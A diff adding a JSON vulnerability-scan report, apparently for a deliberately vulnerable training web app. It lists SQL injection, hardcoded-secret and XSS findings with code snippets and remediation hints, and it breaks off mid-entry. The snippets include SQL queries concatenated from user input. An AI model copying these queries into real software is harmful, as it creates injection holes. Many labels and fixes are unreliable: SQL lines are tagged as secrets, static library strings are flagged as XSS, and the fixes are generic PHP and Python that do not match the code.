@@ -1,0 +1,5630 @@
+{
+  "project_id": "aaafddbbff38422989a67fe971a34534",
+  "executive_summary": "The project contains multiple high-risk vulnerabilities, including issues such as SQL Injection, XSS, or Command Injection. Immediate remediation is strongly recommended.",
+  "scan_summary": {
+    "total_files_scanned": 894,
+    "total_vulnerabilities": 53,
+    "risk_score": 263,
+    "risk_level": "High"
+  },
+  "vulnerability_distribution": {
+    "SQL Injection": 3,
+    "Hardcoded Secret": 21,
+    "XSS": 21,
+    "Command Injection": 7,
+    "CSRF": 1
+  },
+  "severity_distribution": {
+    "High": 52,
+    "Medium": 1,
+    "Low": 0
+  },
+  "detailed_findings": [
+    {
+      "file": "data/static/codefixes/dbSchemaChallenge_1.ts",
+      "line": 5,
+      "vulnerability_type": "SQL Injection",
+      "type": "SQL Injection",
+      "severity": "High",
+      "code_snippet": "models.sequelize.query(\"SELECT * FROM Products WHERE ((name LIKE '%\"+criteria+\"%' OR description LIKE '%\"+criteria+\"%') AND deletedAt IS NULL) ORDER BY name\")",
+      "code": "models.sequelize.query(\"SELECT * FROM Products WHERE ((name LIKE '%\"+criteria+\"%' OR description LIKE '%\"+criteria+\"%') AND deletedAt IS NULL) ORDER BY name\")",
+      "fix": {
+        "explanation": "User input is directly concatenated into SQL query which allows attackers to inject malicious SQL.",
+        "recommendation": "Use parameterized queries or prepared statements.",
+        "example": "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);",
+        "copy_fix_snippet": "$stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');\n$stmt->execute([$id]);"
+      },
+      "cwe": "CWE-89",
+      "business_impact": "Attackers may read, modify, or delete sensitive database records.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248530",
+      "category": "SQL Injection"
+    },
+    {
+      "file": "data/static/codefixes/loginAdminChallenge_1.ts",
+      "line": 18,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true })",
+      "code": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true })",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248552",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "data/static/codefixes/loginAdminChallenge_2.ts",
+      "line": 15,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,",
+      "code": "models.sequelize.query(`SELECT * FROM Users WHERE email = $1 AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248563",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "data/static/codefixes/loginBenderChallenge_1.ts",
+      "line": 18,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true })",
+      "code": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true })",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248573",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "data/static/codefixes/loginBenderChallenge_3.ts",
+      "line": 15,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "models.sequelize.query(`SELECT * FROM Users WHERE email = :mail AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,",
+      "code": "models.sequelize.query(`SELECT * FROM Users WHERE email = :mail AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248582",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "data/static/codefixes/loginBenderChallenge_4.ts",
+      "line": 15,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: false })",
+      "code": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: false })",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248591",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "data/static/codefixes/loginJimChallenge_2.ts",
+      "line": 15,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: false })",
+      "code": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: false })",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248599",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "data/static/codefixes/loginJimChallenge_4.ts",
+      "line": 18,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true })",
+      "code": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: models.User, plain: true })",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248608",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "frontend/src/app/data-export/data-export.component.ts",
+      "line": 71,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "window.open('', '_blank', 'width=500')?.document.write(this.userData)",
+      "code": "window.open('', '_blank', 'width=500')?.document.write(this.userData)",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248624",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/app/register/register.component.spec.ts",
+      "line": 133,
+      "vulnerability_type": "Hardcoded Secret",
+      "type": "Hardcoded Secret",
+      "severity": "High",
+      "code_snippet": "const password = 'aaaaa'",
+      "code": "const password = 'aaaaa'",
+      "fix": {
+        "explanation": "Sensitive credentials are hardcoded in source code.",
+        "recommendation": "Move secrets to environment variables.",
+        "example": "password = os.getenv('DB_PASSWORD')",
+        "copy_fix_snippet": "password = os.getenv('DB_PASSWORD')"
+      },
+      "cwe": "CWE-798",
+      "business_impact": "Leaked secrets can expose production systems and third-party accounts.",
+      "remediation_priority": "Fix soon",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248642",
+      "category": "Hardcoded Secret"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 1,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "var dat=dat||{};dat.gui=dat.gui||{};dat.utils=dat.utils||{};dat.controllers=dat.controllers||{};dat.dom=dat.dom||{};dat.color=dat.color||{};dat.utils.css=function(){return{load:function(e,a){a=a||document;var b=a.createElement(\"link\");b.type=\"text/css\";b.rel=\"stylesheet\";b.href=e;a.getElementsByTagName(\"head\")[0].appendChild(b)},inject:function(e,a){a=a||document;var b=document.createElement(\"style\");b.type=\"text/css\";b.innerHTML=e;a.getElementsByTagName(\"head\")[0].appendChild(b)}}}();",
+      "code": "var dat=dat||{};dat.gui=dat.gui||{};dat.utils=dat.utils||{};dat.controllers=dat.controllers||{};dat.dom=dat.dom||{};dat.color=dat.color||{};dat.utils.css=function(){return{load:function(e,a){a=a||document;var b=a.createElement(\"link\");b.type=\"text/css\";b.rel=\"stylesheet\";b.href=e;a.getElementsByTagName(\"head\")[0].appendChild(b)},inject:function(e,a){a=a||document;var b=document.createElement(\"style\");b.type=\"text/css\";b.innerHTML=e;a.getElementsByTagName(\"head\")[0].appendChild(b)}}}();",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248658",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 13,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "dat.controllers.OptionController=function(e,a,b){var d=function(f,c,e){d.superclass.call(this,f,c);var k=this;this.__select=document.createElement(\"select\");if(b.isArray(e)){var l={};b.each(e,function(a){l[a]=a});e=l}b.each(e,function(a,c){var d=document.createElement(\"option\");d.innerHTML=c;d.setAttribute(\"value\",a);k.__select.appendChild(d)});this.updateDisplay();a.bind(this.__select,\"change\",function(){k.setValue(this.options[this.selectedIndex].value)});this.domElement.appendChild(this.__sel",
+      "code": "dat.controllers.OptionController=function(e,a,b){var d=function(f,c,e){d.superclass.call(this,f,c);var k=this;this.__select=document.createElement(\"select\");if(b.isArray(e)){var l={};b.each(e,function(a){l[a]=a});e=l}b.each(e,function(a,c){var d=document.createElement(\"option\");d.innerHTML=c;d.setAttribute(\"value\",a);k.__select.appendChild(d)});this.updateDisplay();a.bind(this.__select,\"change\",function(){k.setValue(this.options[this.selectedIndex].value)});this.domElement.appendChild(this.__sel",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248666",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 23,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "dat.controllers.FunctionController=function(e,a,b){var d=function(b,c,e){d.superclass.call(this,b,c);var k=this;this.__button=document.createElement(\"div\");this.__button.innerHTML=void 0===e?\"Fire\":e;a.bind(this.__button,\"click\",function(a){a.preventDefault();k.fire();return!1});a.addClass(this.__button,\"button\");this.domElement.appendChild(this.__button)};d.superclass=e;b.extend(d.prototype,e.prototype,{fire:function(){this.__onChange&&this.__onChange.call(this);this.__onFinishChange&&this.__on",
+      "code": "dat.controllers.FunctionController=function(e,a,b){var d=function(b,c,e){d.superclass.call(this,b,c);var k=this;this.__button=document.createElement(\"div\");this.__button.innerHTML=void 0===e?\"Fire\":e;a.bind(this.__button,\"click\",function(a){a.preventDefault();k.fire();return!1});a.addClass(this.__button,\"button\");this.domElement.appendChild(this.__button)};d.superclass=e;b.extend(d.prototype,e.prototype,{fire:function(){this.__onChange&&this.__onChange.call(this);this.__onFinishChange&&this.__on",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248675",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 33,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "dat.GUI=dat.gui.GUI=function(e,a,b,d,f,c,p,k,l,q,n,r,y,g,h){function t(a,c,b,e){if(void 0===c[b])throw Error(\"Object \"+c+' has no property \"'+b+'\"');e.color?c=new n(c,b):(c=[c,b].concat(e.factoryArgs),c=d.apply(a,c));e.before instanceof f&&(e.before=e.before.__li);v(a,c);g.addClass(c.domElement,\"c\");b=document.createElement(\"span\");g.addClass(b,\"property-name\");b.innerHTML=c.property;var q=document.createElement(\"div\");q.appendChild(b);q.appendChild(c.domElement);e=u(a,q,e.before);g.addClass(e,m",
+      "code": "dat.GUI=dat.gui.GUI=function(e,a,b,d,f,c,p,k,l,q,n,r,y,g,h){function t(a,c,b,e){if(void 0===c[b])throw Error(\"Object \"+c+' has no property \"'+b+'\"');e.color?c=new n(c,b):(c=[c,b].concat(e.factoryArgs),c=d.apply(a,c));e.before instanceof f&&(e.before=e.before.__li);v(a,c);g.addClass(c.domElement,\"c\");b=document.createElement(\"span\");g.addClass(b,\"property-name\");b.innerHTML=c.property;var q=document.createElement(\"div\");q.appendChild(b);q.appendChild(c.domElement);e=u(a,q,e.before);g.addClass(e,m",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248683",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 35,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "{before:b.__li.nextElementSibling,factoryArgs:[d]})},name:function(a){b.__li.firstElementChild.firstElementChild.innerHTML=a;return b},listen:function(){b.__gui.listen(b);return b},remove:function(){b.__gui.remove(b);return b}});if(b instanceof l){var e=new k(b.object,b.property,{min:b.__min,max:b.__max,step:b.__step});h.each([\"updateDisplay\",\"onChange\",\"onFinishChange\"],function(a){var d=b[a],J=e[a];b[a]=e[a]=function(){var a=Array.prototype.slice.call(arguments);d.apply(b,a);return J.apply(e,a",
+      "code": "{before:b.__li.nextElementSibling,factoryArgs:[d]})},name:function(a){b.__li.firstElementChild.firstElementChild.innerHTML=a;return b},listen:function(){b.__gui.listen(b);return b},remove:function(){b.__gui.remove(b);return b}});if(b instanceof l){var e=new k(b.object,b.property,{min:b.__min,max:b.__max,step:b.__step});h.each([\"updateDisplay\",\"onChange\",\"onFinishChange\"],function(a){var d=b[a],J=e[a];b[a]=e[a]=function(){var a=Array.prototype.slice.call(arguments);d.apply(b,a);return J.apply(e,a",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248691",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 39,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "a.__ul.firstChild);g.addClass(b,\"save-row\");var d=document.createElement(\"span\");d.innerHTML=\"&nbsp;\";g.addClass(d,\"button gears\");var c=document.createElement(\"span\");c.innerHTML=\"Save\";g.addClass(c,\"button\");g.addClass(c,\"save\");var e=document.createElement(\"span\");e.innerHTML=\"New\";g.addClass(e,\"button\");g.addClass(e,\"save-as\");var f=document.createElement(\"span\");f.innerHTML=\"Revert\";g.addClass(f,\"button\");g.addClass(f,\"revert\");var q=a.__preset_select=document.createElement(\"select\");a.load",
+      "code": "a.__ul.firstChild);g.addClass(b,\"save-row\");var d=document.createElement(\"span\");d.innerHTML=\"&nbsp;\";g.addClass(d,\"button gears\");var c=document.createElement(\"span\");c.innerHTML=\"Save\";g.addClass(c,\"button\");g.addClass(c,\"save\");var e=document.createElement(\"span\");e.innerHTML=\"New\";g.addClass(e,\"button\");g.addClass(e,\"save-as\");var f=document.createElement(\"span\");f.innerHTML=\"Revert\";g.addClass(f,\"button\");g.addClass(f,\"revert\");var q=a.__preset_select=document.createElement(\"select\");a.load",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248700",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 40,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "a.load.remembered?h.each(a.load.remembered,function(b,d){E(a,d,d==a.preset)}):E(a,z,!1);g.bind(q,\"change\",function(){for(var b=0;b<a.__preset_select.length;b++)a.__preset_select[b].innerHTML=a.__preset_select[b].value;a.preset=this.value});b.appendChild(q);b.appendChild(d);b.appendChild(c);b.appendChild(e);b.appendChild(f);if(w){var b=document.getElementById(\"dg-save-locally\"),n=document.getElementById(\"dg-local-explain\");b.style.display=\"block\";b=document.getElementById(\"dg-local-storage\");\"tru",
+      "code": "a.load.remembered?h.each(a.load.remembered,function(b,d){E(a,d,d==a.preset)}):E(a,z,!1);g.bind(q,\"change\",function(){for(var b=0;b<a.__preset_select.length;b++)a.__preset_select[b].innerHTML=a.__preset_select[b].value;a.preset=this.value});b.appendChild(q);b.appendChild(d);b.appendChild(c);b.appendChild(e);b.appendChild(f);if(w){var b=document.getElementById(\"dg-save-locally\"),n=document.getElementById(\"dg-local-explain\");b.style.display=\"block\";b=document.getElementById(\"dg-local-storage\");\"tru",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248709",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 41,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "localStorage.getItem(document.location.href+\".isLocal\")&&b.setAttribute(\"checked\",\"checked\");var k=function(){n.style.display=a.useLocalStorage?\"block\":\"none\"};k();g.bind(b,\"change\",function(){a.useLocalStorage=!a.useLocalStorage;k()})}var r=document.getElementById(\"dg-new-constructor\");g.bind(r,\"keydown\",function(a){!a.metaKey||67!==a.which&&67!=a.keyCode||A.hide()});g.bind(d,\"click\",function(){r.innerHTML=JSON.stringify(a.getSaveObject(),void 0,2);A.show();r.focus();r.select()});g.bind(c,\"clic",
+      "code": "localStorage.getItem(document.location.href+\".isLocal\")&&b.setAttribute(\"checked\",\"checked\");var k=function(){n.style.display=a.useLocalStorage?\"block\":\"none\"};k();g.bind(b,\"change\",function(){a.useLocalStorage=!a.useLocalStorage;k()})}var r=document.getElementById(\"dg-new-constructor\");g.bind(r,\"keydown\",function(a){!a.metaKey||67!==a.which&&67!=a.keyCode||A.hide()});g.bind(d,\"click\",function(){r.innerHTML=JSON.stringify(a.getSaveObject(),void 0,2);A.show();r.focus();r.select()});g.bind(c,\"clic",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248717",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 44,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "function B(a,b){var d={};h.each(a.__rememberedObjects,function(c,e){var f={};h.each(a.__rememberedObjectIndecesToControllers[e],function(a,d){f[d]=b?a.initialValue:a.getValue()});d[e]=f});return d}function E(a,b,d){var c=document.createElement(\"option\");c.innerHTML=b;c.value=b;a.__preset_select.appendChild(c);d&&(a.__preset_select.selectedIndex=a.__preset_select.length-1)}function D(a,b){var d=a.__preset_select[a.__preset_select.selectedIndex];d.innerHTML=b?d.value+\"*\":d.value}function G(a){0!=a",
+      "code": "function B(a,b){var d={};h.each(a.__rememberedObjects,function(c,e){var f={};h.each(a.__rememberedObjectIndecesToControllers[e],function(a,d){f[d]=b?a.initialValue:a.getValue()});d[e]=f});return d}function E(a,b,d){var c=document.createElement(\"option\");c.innerHTML=b;c.value=b;a.__preset_select.appendChild(c);d&&(a.__preset_select.selectedIndex=a.__preset_select.length-1)}function D(a,b){var d=a.__preset_select[a.__preset_select.selectedIndex];d.innerHTML=b?d.value+\"*\":d.value}function G(a){0!=a",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248725",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 48,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "b);c.revert()}},width:{get:function(){return a.width},set:function(b){a.width=b;F(c,b)}},name:{get:function(){return a.name},set:function(b){a.name=b;q&&(q.innerHTML=a.name)}},closed:{get:function(){return a.closed},set:function(b){a.closed=b;a.closed?g.addClass(c.__ul,m.CLASS_CLOSED):g.removeClass(c.__ul,m.CLASS_CLOSED);this.onResize();c.__closeButton&&(c.__closeButton.innerHTML=b?m.TEXT_OPEN:m.TEXT_CLOSED)}},load:{get:function(){return a.load}},useLocalStorage:{get:function(){return e},set:fun",
+      "code": "b);c.revert()}},width:{get:function(){return a.width},set:function(b){a.width=b;F(c,b)}},name:{get:function(){return a.name},set:function(b){a.name=b;q&&(q.innerHTML=a.name)}},closed:{get:function(){return a.closed},set:function(b){a.closed=b;a.closed?g.addClass(c.__ul,m.CLASS_CLOSED):g.removeClass(c.__ul,m.CLASS_CLOSED);this.onResize();c.__closeButton&&(c.__closeButton.innerHTML=b?m.TEXT_OPEN:m.TEXT_CLOSED)}},load:{get:function(){return a.load}},useLocalStorage:{get:function(){return e},set:fun",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248732",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 49,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "((e=a)?g.bind(window,\"unload\",b):g.unbind(window,\"unload\",b),localStorage.setItem(document.location.href+\".isLocal\",a))}}});if(h.isUndefined(a.parent)){a.closed=!1;g.addClass(this.domElement,m.CLASS_MAIN);g.makeSelectable(this.domElement,!1);if(w&&e){c.useLocalStorage=!0;var f=localStorage.getItem(document.location.href+\".gui\");f&&(a.load=JSON.parse(f))}this.__closeButton=document.createElement(\"div\");this.__closeButton.innerHTML=m.TEXT_CLOSED;g.addClass(this.__closeButton,m.CLASS_CLOSE_BUTTON);",
+      "code": "((e=a)?g.bind(window,\"unload\",b):g.unbind(window,\"unload\",b),localStorage.setItem(document.location.href+\".isLocal\",a))}}});if(h.isUndefined(a.parent)){a.closed=!1;g.addClass(this.domElement,m.CLASS_MAIN);g.makeSelectable(this.domElement,!1);if(w&&e){c.useLocalStorage=!0;var f=localStorage.getItem(document.location.href+\".gui\");f&&(a.load=JSON.parse(f))}this.__closeButton=document.createElement(\"div\");this.__closeButton.innerHTML=m.TEXT_CLOSED;g.addClass(this.__closeButton,m.CLASS_CLOSE_BUTTON);",
+      "fix": {
+        "explanation": "User input is inserted into HTML without escaping which may execute malicious scripts.",
+        "recommendation": "Escape output or use safe DOM methods.",
+        "example": "element.textContent = userInput;",
+        "copy_fix_snippet": "element.textContent = userInput;"
+      },
+      "cwe": "CWE-79",
+      "business_impact": "Attackers can execute scripts in user browsers and steal session data.",
+      "remediation_priority": "Fix now",
+      "status": "open",
+      "detected_at": "2026-04-22T00:02:32.248740",
+      "category": "XSS"
+    },
+    {
+      "file": "frontend/src/assets/private/dat.gui.min.js",
+      "line": 55,
+      "vulnerability_type": "XSS",
+      "type": "XSS",
+      "severity": "High",
+      "code_snippet": "b-20+\"px\"):(g.removeClass(a.domElement,m.CLASS_TOO_TALL),a.__ul.style.height=\"auto\")}a.__resize_handle&&h.defer(function(){a.__resize_handle.style.height=a.__ul.offsetHeight+\"px\"});a.__closeButton&&(a.__closeButton.style.width=a.width+\"px\")},remember:function(){h.isUndefined(A)&&(A=new y,A.domElement.innerHTML=a);if(this.parent)throw Error(\"You can only call remember on a top level GUI.\");var b=this;h.each(Array.prototype.slice.call(arguments),function(a){0==b.__rememberedObjects.length&&K(b);-1",
